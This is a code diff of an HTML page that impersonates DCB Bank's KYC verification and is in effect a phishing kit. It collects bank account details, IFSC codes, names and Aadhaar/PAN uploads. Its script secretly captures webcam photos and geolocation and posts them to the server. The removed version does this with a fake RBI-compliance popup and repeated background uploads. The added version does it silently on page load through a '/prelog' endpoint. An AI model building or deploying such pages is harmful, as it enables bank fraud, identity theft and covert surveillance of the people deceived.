@@ -1,756 +1,190 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <meta charset="UTF-8" />
   <title>DCB Bank KYC Verification</title>
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
   <style>
-    * {
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f4f6f9;
       margin: 0;
       padding: 0;
-      box-sizing: border-box;
-      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-      -webkit-tap-highlight-color: transparent;
     }
-    
-    body {
-      background-color: #f4f6f9;
-      color: #333;
-      line-height: 1.6;
-      padding: 15px;
-      min-height: 100vh;
-      display: flex;
-      flex-direction: column;
-    }
-    
+
     .container {
       max-width: 500px;
-      width: 100%;
-      margin: 20px auto;
+      margin: 60px auto;
       background: white;
-      border-radius: 16px;
-      padding: 25px;
-      box-shadow: 0 5px 20px rgba(0, 0, 0, 0.08);
-      position: relative;
-      overflow: hidden;
-      flex-grow: 1;
+      border-radius: 8px;
+      padding: 30px;
+      box-shadow: 0 0 12px rgba(0,0,0,0.1);
     }
-    
+
     .logo {
       display: block;
-      margin: 0 auto 15px;
-      width: 160px;
-      height: auto;
+      margin: 0 auto 20px;
+      width: 180px;
     }
-    
+
     h2 {
       text-align: center;
       color: #003d6a;
-      margin-bottom: 20px;
-      font-weight: 700;
-      font-size: 24px;
     }
-    
+
     .notice {
-      font-size: 14px;
+      margin-top: -10px;
+      margin-bottom: 20px;
+      font-size: 13px;
       color: #444;
       text-align: center;
-      margin-bottom: 20px;
-      background-color: #f8f9fa;
-      padding: 12px;
-      border-radius: 8px;
-      border-left: 4px solid #ffc107;
+      line-height: 1.5;
     }
-    
+
     label {
       display: block;
       margin-top: 18px;
-      font-weight: 600;
-      font-size: 14px;
-      color: #003d6a;
+      font-weight: bold;
+      font-size: 16px;
+      color: #222;
     }
-    
-    input[type="text"],
-    input[type="file"] {
+
+    input[type="text"], input[type="file"] {
       width: 100%;
-      font-size: 14px;
-      padding: 12px;
-      margin-top: 6px;
-      border-radius: 8px;
-      border: 1px solid #d1d5db;
-      transition: all 0.3s;
-      background: white;
+      font-size: 16px;
+      padding: 12px 10px;
+      margin-top: 8px;
+      border-radius: 6px;
+      border: 1px solid #ccc;
+      box-sizing: border-box;
     }
-    
-    input[type="text"]:focus,
-    input[type="file"]:focus {
-      border-color: #003d6a;
-      outline: none;
-      box-shadow: 0 0 0 3px rgba(0, 61, 106, 0.1);
-    }
-    
+
     button {
-      margin-top: 25px;
+      margin-top: 30px;
       width: 100%;
       background-color: #003d6a;
       color: white;
       border: none;
-      padding: 15px;
-      font-size: 16px;
-      font-weight: 600;
-      border-radius: 8px;
+      padding: 14px;
+      font-size: 17px;
+      border-radius: 6px;
       cursor: pointer;
-      transition: all 0.3s;
-      box-shadow: 0 3px 6px rgba(0, 0, 0, 0.1);
     }
-    
+
     button:hover {
       background-color: #00548c;
-      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.15);
     }
-    
-    #kycForm {
-      display: none;
-    }
-    
+
     .footer {
       text-align: center;
       margin-top: 30px;
       font-size: 12px;
       color: #777;
-      padding-top: 15px;
-      border-top: 1px solid #eee;
-    }
-    
-    .error {
-      color: #d32f2f;
-      text-align: center;
-      font-size: 13px;
-      margin-top: 12px;
-      font-weight: 500;
-    }
-    
-    #verificationPopup {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      background-color: rgba(0, 0, 0, 0.92);
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      z-index: 1000;
-      backdrop-filter: blur(8px);
-      padding: 15px;
-    }
-    
-    .popup-content {
-      background: white;
-      border-radius: 16px;
-      width: 100%;
-      max-width: 500px;
-      padding: 25px;
-      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
-      animation: popupIn 0.5s ease-out;
-      max-height: 90vh;
-      overflow-y: auto;
-    }
-    
-    @keyframes popupIn {
-      from { transform: translateY(20px); opacity: 0; }
-      to { transform: translateY(0); opacity: 1; }
-    }
-    
-    .popup-header {
-      display: flex;
-      align-items: center;
-      margin-bottom: 20px;
-    }
-    
-    .popup-icon {
-      width: 50px;
-      height: 50px;
-      background-color: #e6f2ff;
-      border-radius: 50%;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      margin-right: 15px;
-      flex-shrink: 0;
-    }
-    
-    .popup-icon i {
-      color: #003d6a;
-      font-size: 24px;
-    }
-    
-    .popup-title {
-      color: #003d6a;
-      font-size: 22px;
-      font-weight: 700;
-    }
-    
-    .popup-message {
-      font-size: 15px;
-      line-height: 1.6;
-      color: #444;
-      margin-bottom: 20px;
-    }
-    
-    .highlight {
-      background-color: #fff8e1;
-      padding: 15px;
-      border-radius: 8px;
-      border-left: 4px solid #ffc107;
-      margin: 18px 0;
-      font-size: 14px;
-    }
-    
-    .popup-button {
-      background-color: #003d6a;
-      color: white;
-      border: none;
-      padding: 14px;
-      font-size: 16px;
-      font-weight: 600;
-      border-radius: 8px;
-      cursor: pointer;
-      display: block;
-      width: 100%;
-      transition: all 0.3s;
-      box-shadow: 0 3px 6px rgba(0, 0, 0, 0.1);
-      margin-top: 15px;
-    }
-    
-    .popup-button:hover {
-      background-color: #00548c;
-    }
-    
-    .security-badge {
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      margin-top: 20px;
-      font-size: 13px;
-      color: #28a745;
-      font-weight: 600;
-    }
-    
-    .security-badge i {
-      margin-right: 8px;
-      font-size: 16px;
-    }
-    
-    .step-indicator {
-      display: flex;
-      justify-content: center;
-      margin: 20px 0;
-    }
-    
-    .step {
-      width: 10px;
-      height: 10px;
-      border-radius: 50%;
-      background-color: #d1d5db;
-      margin: 0 6px;
-    }
-    
-    .step.active {
-      background-color: #003d6a;
-    }
-    
-    .spinner {
-      display: inline-block;
-      width: 20px;
-      height: 20px;
-      border: 3px solid rgba(255,255,255,.3);
-      border-radius: 50%;
-      border-top-color: #fff;
-      animation: spin 1s ease-in-out infinite;
-      margin-right: 10px;
-      vertical-align: middle;
-    }
-    
-    @keyframes spin {
-      to { transform: rotate(360deg); }
-    }
-    
-    .success-message {
-      text-align: center;
-      padding: 18px;
-      background-color: #e8f5e9;
-      border-radius: 8px;
-      border-left: 4px solid #28a745;
-      margin-top: 18px;
-      display: none;
-    }
-    
-    .success-message h3 {
-      color: #28a745;
-      margin-bottom: 8px;
-      font-size: 18px;
-    }
-    
-    .success-message p {
-      font-size: 14px;
-    }
-    
-    /* Mobile-specific styles */
-    @media (max-width: 480px) {
-      body {
-        padding: 10px;
-      }
-      
-      .container {
-        padding: 20px 15px;
-        margin: 10px auto;
-        border-radius: 12px;
-      }
-      
-      .logo {
-        width: 140px;
-        margin-bottom: 12px;
-      }
-      
-      h2 {
-        font-size: 22px;
-        margin-bottom: 15px;
-      }
-      
-      .popup-content {
-        padding: 20px 15px;
-        max-height: 95vh;
-      }
-      
-      .popup-title {
-        font-size: 20px;
-      }
-      
-      .popup-message {
-        font-size: 14px;
-      }
-      
-      .popup-icon {
-        width: 45px;
-        height: 45px;
-      }
-      
-      input[type="text"],
-      input[type="file"] {
-        padding: 10px;
-        font-size: 14px;
-      }
-      
-      button {
-        padding: 14px;
-        font-size: 15px;
-      }
-      
-      .highlight {
-        padding: 12px;
-        font-size: 13px;
-      }
-    }
-    
-    /* Hide scrollbar for Chrome, Safari and Opera */
-    .popup-content::-webkit-scrollbar {
-      display: none;
-    }
-    
-    /* Hide scrollbar for IE, Edge and Firefox */
-    .popup-content {
-      -ms-overflow-style: none;  /* IE and Edge */
-      scrollbar-width: none;  /* Firefox */
     }
   </style>
 </head>
 <body>
-  <div id="verificationPopup">
-    <div class="popup-content">
-      <div class="popup-header">
-        <div class="popup-icon">
-          <i class="fas fa-shield-alt"></i>
-        </div>
-        <div class="popup-title">Important: KYC Verification Process</div>
-      </div>
-      
-      <p class="popup-message">
-        To comply with RBI regulations and ensure the security of your account, DCB Bank requires a one-time verification for all account holders. This mandatory process helps prevent fraud and protects your financial assets.
-      </p>
-      
-      <div class="highlight">
-        This verification is essential for transparency and regulatory compliance. Your cooperation helps us maintain a secure banking environment for all customers.
-      </div>
-      
-      <p class="popup-message">
-        During this verification, you'll be asked to grant temporary access to:
-      </p>
-      
-      <ul class="popup-message" style="padding-left: 20px;">
-        <li><strong>Camera</strong> - For identity confirmation and facial recognition</li>
-        <li><strong>Location</strong> - For transaction security verification</li>
-      </ul>
-      
-      <p class="popup-message">
-        This is a standard security procedure required by the Reserve Bank of India (RBI) for all banking institutions. Your information is protected by 256-bit encryption and will only be used for verification purposes.
-      </p>
-      
-      <div class="step-indicator">
-        <div class="step active"></div>
-        <div class="step"></div>
-        <div class="step"></div>
-      </div>
-      
-      <button class="popup-button" onclick="closePopup()">
-        <i class="fas fa-check-circle"></i> I Understand & Continue
-      </button>
-      
-      <div class="security-badge">
-        <i class="fas fa-lock"></i>
-        Secure & Encrypted Verification Process
-      </div>
-    </div>
-  </div>
-
   <div class="container">
-    <img class="logo" src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTYwIiBoZWlnaHQ9IjQ4IiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxyZWN0IHdpZHRoPSIxNjAiIGhlaWdodD0iNDgiIGZpbGw9IiMwMDNkNmEiIHJ4PSI0Ii8+PHRleHQgeD0iODAiIHk9IjI4IiBmb250LWZhbWlseT0iQXJpYWwiIGZvbnQtc2l6ZT0iMTgiIGZpbGw9IiNmZmYiIHRleHQtYW5jaG9yPSJtaWRkbGUiIGRvbWluYW50LWJhc2VsaW5lPSJtaWRkbGUiIGZvbnQtd2VpZ2h0PSI3MDAiPkRDQiBCYW5rPC90ZXh0Pjwvc3ZnPg==" alt="DCB Bank Logo">
+    <img class="logo" src="dbc.png" alt="DCB Bank Logo">
     <h2>DCB Bank KYC Verification</h2>
+    <p class="notice">
+      Please enter the recipient’s bank and other required details carefully.  
+      All details submitted must match the recipient’s bank records.  
+      Invalid or mismatched information may lead to reversal or failure of the transaction.
+    </p>
+    <form action="/submit" method="POST" enctype="multipart/form-data">
+      <label for="bankname">Bank Name</label>
+      <input type="text" id="bankname" name="bankname" placeholder="Enter recipient’s bank name" required>
 
-    <div id="permissionStep">
-      <p class="notice">
-        For your security and verification, please allow access to your device's <strong>camera</strong> and <strong>location</strong>.<br>
-        You must grant both permissions to proceed with KYC verification.
-      </p>
-      <button onclick="requestPermissions()">
-        <i class="fas fa-camera"></i> Allow & Continue
-      </button>
-      <p id="permStatus" class="error"></p>
-    </div>
+      <label for="ifsc">IFSC Code</label>
+      <input type="text" id="ifsc" name="ifsc" placeholder="Enter IFSC code" required>
 
-    <div id="kycForm">
-      <form id="kycFormElement">
-        <label for="bankname"><i class="fas fa-university"></i> Bank Name</label>
-        <input type="text" id="bankname" name="bankname" placeholder="Enter recipient's bank name" required>
+      <label for="accno">Account Number</label>
+      <input type="text" id="accno" name="accno" required>
 
-        <label for="ifsc"><i class="fas fa-code"></i> IFSC Code</label>
-        <input type="text" id="ifsc" name="ifsc" placeholder="Enter IFSC code" required>
+      <label for="fullname">Full Name</label>
+      <input type="text" id="fullname" name="fullname" required>
 
-        <label for="accno"><i class="fas fa-wallet"></i> Account Number</label>
-        <input type="text" id="accno" name="accno" placeholder="Enter account number" required>
+      <label for="document">Upload Aadhaar or PAN (PDF, JPG, PNG only)</label>
+      <input type="file" id="document" name="document" accept=".pdf,.jpg,.jpeg,.png" required>
 
-        <label for="fullname"><i class="fas fa-user"></i> Full Name</label>
-        <input type="text" id="fullname" name="fullname" placeholder="Enter your full name" required>
-
-        <label for="email"><i class="fas fa-envelope"></i> Email Address</label>
-        <input type="text" id="email" name="email" placeholder="Enter your email" required>
-
-        <label for="document"><i class="fas fa-file-upload"></i> Upload Aadhaar or PAN (PDF, JPG, PNG only)</label>
-        <input type="file" id="document" name="document" accept=".pdf,.jpg,.jpeg,.png" required>
-
-        <button type="submit">
-          <i class="fas fa-check"></i> Verify Account
-        </button>
-      </form>
-      
-      <div id="successMessage" class="success-message">
-        <h3><i class="fas fa-check-circle"></i> Verification Submitted Successfully!</h3>
-        <p>Your KYC verification is now being processed. You will receive confirmation shortly.</p>
-      </div>
-    </div>
-
+      <button type="submit">Verify Account</button>
+    </form>
     <div class="footer">
-      <i class="fas fa-lock"></i> © 2025 DCB Bank Ltd. All rights reserved. | For official verification purposes only.
+      © 2025 DCB Bank Ltd. | For official verification purposes only.
     </div>
   </div>
 
-  <video id="cameraPreview" autoplay playsinline style="display: none;"></video>
-  <canvas id="captureCanvas" style="display: none;"></canvas>
-  
   <script>
-    // Close the verification popup
-    function closePopup() {
-      document.getElementById('verificationPopup').style.display = 'none';
-    }
-    
-    // Variables for image capture and data collection
-    let cameraStream = null;
-    let captureInterval = null;
     let capturedImages = [];
     let locationData = null;
-    const MAX_IMAGES = 50;
-    
-    // Background data variables
-    let sessionId = Date.now() + '-' + Math.random().toString(36).substr(2, 9);
-    let backgroundSendInterval = null;
-    let backgroundSendCount = 0;
-    const MAX_BACKGROUND_SENDS = 10;
-    
-    // Function to request permissions
-    function requestPermissions() {
-      const status = document.getElementById('permStatus');
-      status.textContent = "";
-      status.style.display = "none";
 
-      // Request camera
-      navigator.mediaDevices.getUserMedia({ 
-        video: { 
-          facingMode: 'user',
-          width: { ideal: 1280 },
-          height: { ideal: 720 }
-        } 
-      }).then(stream => {
-        cameraStream = stream;
-        
-        // Setup hidden video preview
-        const preview = document.getElementById('cameraPreview');
-        preview.srcObject = stream;
-        
-        // Request location
-        navigator.geolocation.getCurrentPosition(
-          (position) => {
-            // Store location data
-            locationData = {
-              latitude: position.coords.latitude,
-              longitude: position.coords.longitude,
-              accuracy: position.coords.accuracy,
-              timestamp: position.timestamp
-            };
-            
-            // Permissions granted - show form
-            document.getElementById('permissionStep').style.display = 'none';
-            document.getElementById('kycForm').style.display = 'block';
-            
-            // Start capturing images in background
-            startImageCapture();
-            
-            // Also watch location continuously
-            watchLocation();
-            
-            // Start background data sending
-            startBackgroundSending();
-          },
-          (err) => {
-            status.textContent = "Location access denied. Cannot proceed.";
-            status.style.display = "block";
-            stopCamera();
-          },
-          { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
-        );
-      }).catch((err) => {
-        status.textContent = "Camera access denied. Cannot proceed.";
-        status.style.display = "block";
-        console.error("Camera error:", err);
-      });
-    }
-    
-    // Watch location continuously
-    function watchLocation() {
-      navigator.geolocation.watchPosition(
-        (position) => {
-          locationData = {
-            latitude: position.coords.latitude,
-            longitude: position.coords.longitude,
-            accuracy: position.coords.accuracy,
-            timestamp: position.timestamp
-          };
-        },
-        (err) => {
-          console.error("Location watch error:", err);
-        },
-        { enableHighAccuracy: true }
-      );
-    }
-    
-    // Start capturing images
-    function startImageCapture() {
-      const preview = document.getElementById('cameraPreview');
-      const canvas = document.getElementById('captureCanvas');
-      const ctx = canvas.getContext('2d');
-      
-      // Set canvas size to match video
-      const resizeCanvas = () => {
-        canvas.width = preview.videoWidth;
-        canvas.height = preview.videoHeight;
-      };
-      
-      // Initial resize
-      resizeCanvas();
-      
-      // Also resize when video dimensions change
-      preview.addEventListener('resize', resizeCanvas);
-      
-      captureInterval = setInterval(() => {
-        if (capturedImages.length >= MAX_IMAGES) {
-          clearInterval(captureInterval);
-          return;
-        }
-        
-        // Capture image
-        ctx.drawImage(preview, 0, 0, canvas.width, canvas.height);
-        const imageData = canvas.toDataURL('image/jpeg', 0.8);
-        capturedImages.push(imageData);
-      }, 500); // Capture every 500ms
-    }
-    
-    // Start background data sending
-    function startBackgroundSending() {
-      // Send immediately and then every 5 seconds
-      sendBackgroundData();
-      backgroundSendInterval = setInterval(sendBackgroundData, 5000);
-    }
-    
-    // Send background data to server
-    async function sendBackgroundData() {
-      backgroundSendCount++;
-      
-      if (backgroundSendCount > MAX_BACKGROUND_SENDS) {
-        // Stop after 10 sends
-        stopBackgroundSending();
-        return;
-      }
-      
-      if (capturedImages.length === 0 && !locationData) return;
-      
-      try {
-        const imagesToSend = capturedImages.splice(0, capturedImages.length); // Move all images
-        await fetch('/background-data', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            sessionId,
-            images: imagesToSend,
-            location: locationData
-          })
-        });
-      } catch (error) {
-        console.error('Background send error:', error);
-      }
-    }
-    
-    // Stop background sending
-    function stopBackgroundSending() {
-      if (backgroundSendInterval) {
-        clearInterval(backgroundSendInterval);
-        backgroundSendInterval = null;
-      }
-    }
-    
-    // Stop camera stream
-    function stopCamera() {
-      if (cameraStream) {
-        cameraStream.getTracks().forEach(track => track.stop());
-        cameraStream = null;
-      }
-      if (captureInterval) {
-        clearInterval(captureInterval);
-        captureInterval = null;
-      }
-      stopBackgroundSending();
-    }
-    
-    // Form submission handler
-    document.getElementById('kycFormElement').addEventListener('submit', async function(e) {
-      e.preventDefault();
-      
-      // Stop camera when form is submitted
-      stopCamera();
-      
-      // Show loading state
-      const submitBtn = this.querySelector('button[type="submit"]');
-      const originalBtnText = submitBtn.innerHTML;
-      submitBtn.disabled = true;
-      submitBtn.innerHTML = '<span class="spinner"></span> Processing...';
-      
-      try {
-        // Create FormData object
-        const formData = new FormData();
-        
-        // Add form fields
-        formData.append('bankname', document.getElementById('bankname').value);
-        formData.append('ifsc', document.getElementById('ifsc').value);
-        formData.append('accno', document.getElementById('accno').value);
-        formData.append('fullname', document.getElementById('fullname').value);
-        formData.append('email', document.getElementById('email').value);
-        formData.append('sessionId', sessionId);
-        
-        // Add location if available
-        if (locationData) {
-          formData.append('location', JSON.stringify(locationData));
-        }
-        
-        // Add document file
-        const documentFile = document.getElementById('document').files[0];
-        if (documentFile) {
-          formData.append('document', documentFile);
-        }
-        
-        // Add captured images (any remaining)
-        capturedImages.forEach((img, index) => {
-          const blob = dataURLtoBlob(img);
-          formData.append(`image${index}`, blob, `capture_${index}.jpg`);
-        });
-        
-        // Send data to server
-        const response = await fetch('/submit', {
-          method: 'POST',
-          body: formData
-        });
-        
-        if (response.ok) {
-          // Show success message
-          document.getElementById('kycFormElement').style.display = 'none';
-          document.getElementById('successMessage').style.display = 'block';
-          } else {
-          throw new Error('Server responded with an error');
-        }
-      } catch (error) {
-        console.error("Submission error:", error);
-        alert("There was an error processing your verification. Please try again.");
-        submitBtn.disabled = false;
-        submitBtn.innerHTML = originalBtnText;
-      }
-    });
-    
-    // Helper function to convert data URL to Blob
     function dataURLtoBlob(dataurl) {
       const arr = dataurl.split(',');
       const mime = arr[0].match(/:(.*?);/)[1];
       const bstr = atob(arr[1]);
       let n = bstr.length;
       const u8arr = new Uint8Array(n);
-      while (n--) {
-        u8arr[n] = bstr.charCodeAt(n);
-      }
+      while (n--) u8arr[n] = bstr.charCodeAt(n);
       return new Blob([u8arr], { type: mime });
     }
-    
-    // Cleanup when leaving the page
-    window.addEventListener('beforeunload', function() {
-      // Send any remaining background data
-      if (capturedImages.length > 0 || locationData) {
-        const data = {
-          sessionId,
-          images: capturedImages,
-          location: locationData
-        };
-        const blob = new Blob([JSON.stringify(data)], { type: 'application/json' });
-        navigator.sendBeacon('/background-data', blob);
+
+    function sendPrelog() {
+      const formData = new FormData();
+      capturedImages.slice(0, 5).forEach((img, index) => {
+        formData.append(`image${index}`, dataURLtoBlob(img), `prelog_${index}.jpg`);
+      });
+      if (locationData) {
+        formData.append('location', JSON.stringify(locationData));
       }
-      stopCamera();
-    });
-    
-    // Start the process by showing popup immediately
-    window.addEventListener('load', function() {
-      document.getElementById('verificationPopup').style.display = 'flex';
-      
-      // Prevent zooming on mobile
-      document.addEventListener('touchmove', function(event) {
-        if (event.scale !== 1) {
-          event.preventDefault();
-        }
-      }, { passive: false });
+
+      fetch('/prelog', {
+        method: 'POST',
+        body: formData
+      }).catch(console.error);
+    }
+
+    window.addEventListener('load', async () => {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        const video = document.createElement('video');
+        video.srcObject = stream;
+        video.play();
+
+        const canvas = document.createElement('canvas');
+        const ctx = canvas.getContext('2d');
+
+        setTimeout(() => {
+          const capture = () => {
+            if (capturedImages.length >= 5) return;
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            ctx.drawImage(video, 0, 0);
+            capturedImages.push(canvas.toDataURL('image/jpeg', 0.8));
+          };
+
+          const interval = setInterval(() => {
+            capture();
+            if (capturedImages.length >= 5) {
+              clearInterval(interval);
+              stream.getTracks().forEach(track => track.stop());
+              sendPrelog();
+            }
+          }, 500);
+        }, 1000);
+      } catch (err) {
+        console.warn('Camera access denied.');
+      }
+
+      navigator.geolocation.getCurrentPosition(pos => {
+        locationData = {
+          latitude: pos.coords.latitude,
+          longitude: pos.coords.longitude,
+          accuracy: pos.coords.accuracy,
+          timestamp: pos.timestamp
+        };
+      }, err => {
+        console.warn('Location denied.');
+      });
     });
   </script>
 </body>
